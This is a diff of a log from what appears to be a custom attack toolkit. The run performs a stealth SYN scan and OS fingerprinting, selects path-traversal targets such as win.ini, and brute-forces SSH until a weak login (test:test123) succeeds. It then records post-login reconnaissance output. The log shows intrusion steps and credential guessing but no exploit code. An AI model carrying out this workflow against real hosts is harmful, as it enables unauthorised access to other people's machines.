@@ -1,7 +1,7 @@
 ﻿=============================================================================
 SSH EXPLOIT & TARGET VERIFICATION RUN
-Date       : 2026-09-14 00:03:58
-Target IP  : 192.168.1.104
+Date       : 2026-09-29 15:03:28
+Target IP  : 10.175.160.165
 Adapter    : \Device\NPF_{79613882-4F62-495C-9891-92E06A2C6E9B}
 Ports      : [22] (SSH)
 Attack Mode: QUIET / STEALTH (Silent Recon Only - No Payloads/Voice)
@@ -11,19 +11,19 @@ Exploits   : Enabled (Phase 5 will attempt weak-credential SSH login)
 ═════════════════════════════════════════════════════════════════
   CUSTOM PORT SCANNER — ATTACK TOOLKIT
 ═════════════════════════════════════════════════════════════════
-  Target       : 192.168.1.104
-  Attacker     : 192.168.1.105 (d8:80:83:74:7c:b3)
-  Target MAC   : 98:fe:3e:5b:c3:27
+  Target       : 10.175.160.165
+  Attacker     : 10.175.160.126 (d8:80:83:74:7c:b3)
+  Target MAC   : a0:29:42:92:ef:19
   Ports        : [22]
   Scan delay   : 0.5s
 
 ═════════════════════════════════════════════════════════════════
   [PHASE 1] TCP SYN Port Scanning
 ═════════════════════════════════════════════════════════════════
-  Target      : 192.168.1.104
-  Attacker IP : 192.168.1.105
+  Target      : 10.175.160.165
+  Attacker IP : 10.175.160.126
   Attacker MAC: d8:80:83:74:7c:b3
-  Target MAC  : 98:fe:3e:5b:c3:27
+  Target MAC  : a0:29:42:92:ef:19
   Ports       : 1
   Delay       : 0.50s
 ─────────────────────────────────────────────────────────────────
@@ -47,15 +47,10 @@ Exploits   : Enabled (Phase 5 will attempt weak-credential SSH login)
   TTL        : 128 (initial 128, ~0 hop(s))
   Window     : 65535
   DF bit     : set
-  IP ID Seq  : [54642, 54644, 54645] (deltas: [2, 1])
+  IP ID Seq  : [32300, 32302, 32303] (deltas: [2, 1])
   IP ID Class: STRICT_INCREMENTAL
-  Options    : ('MSS', 1460), ('NOP',), ('WSCALE', 8), ('SACK_PERMITTED',), ('TIMESTAMP', 287954645, 1)
-  Timestamp  : Clock Rate: ~992.1 Hz (HZ_1000)
-  Uptime     : ~3 day(s), 8 hour(s), 37 min(s)
-  ECN Probe  : Ignored / Not Negotiated (ECE reflected: False, Flags: 0x12) [Default Windows Stack]
-  Invalid Flgs: RST on Open Port (Flags=0x14, Windows Rule-Breaker)
-  ICMP/UDP   : Windows Stack (Code=0 normalized, TTL=128, U1 quotes 328B)
-  Cross-Layer: 1 banner signature(s) correlated
+  Options    : ('MSS', 1460), ('NOP',), ('WSCALE', 8), ('SACK_PERMITTED',), ('TIMESTAMP', 18977077, 1)
+  Cross-Layer: 1 banner signature(s)
   Probability:
     Windows           75%  ###############
     Linux             12%  ##
@@ -72,10 +67,17 @@ Exploits   : Enabled (Phase 5 will attempt weak-credential SSH login)
     - window scale=8
     - IP ID sequence is strictly incremental (deltas: [2, 1], avg: 1.5) (Windows sequential/global counter)
     - Cross-layer banner on port 22 (SSH) matches Windows signature 'OpenSSH_for_Windows' (Microsoft Windows OpenSSH port)
-    - TCP timestamp clock frequency ~992.1 Hz matches modern Windows 10/11 (1000 Hz / 1ms tick) or Linux low-latency
+    - TCP timestamp clock frequency ~897.5 Hz matches modern Windows 10/11 (1000 Hz / 1ms tick) or Linux low-latency
     - RFC 3168 ECN flags ignored (ECE=0, CWR=0 in SYN/ACK) -- characteristic of default Windows TCP/IP stack
     - Ambiguous/invalid TCP flags (SYN+FIN) on open port elicited RST response (Flags=0x14) -- characteristic of Windows stack (RFC 793 rule-breaker)
     - ICMP Echo Reply normalized Code=0 (Code 9 probe) with TTL=128, U1 quotes 328B -- characteristic of Windows stack
+
+═════════════════════════════════════════════════════════════════
+  [PHASE 4] OS-Aware Payload Selection
+═════════════════════════════════════════════════════════════════
+  Target OS family: Windows
+  Traversal targets: ['windows\\win.ini', 'windows\\system.ini', 'win.ini (forward slash)', 'win.ini (URL-encoded)']
+  RCE command      : whoami
 
 ═════════════════════════════════════════════════════════════════
   [PHASE 5] Exploit Execution
@@ -88,10 +90,10 @@ Exploits   : Enabled (Phase 5 will attempt weak-credential SSH login)
   Detail   : Logged in as test:test123 (attempt 15/20)
   Attempts : 15
   Commands :
-    whoami → aisheepc\test
-    hostname → AisheePC
-    ipconfig → 169.254.17.114, 169.254.58.27, 169.254.213.23, 192.168.1.104
-    os_info → Microsoft Windows [Version 10.0.26200.9445]
+    whoami → turjolap\test
+    hostname → TURJOLAP
+    ipconfig → 192.168.56.1, 169.254.44.183, 169.254.33.164, 10.175.160.165, 169.254.34.135
+    os_info → Microsoft Windows [Version 10.0.26200.9457]
 
 
 ═════════════════════════════════════════════════════════════════
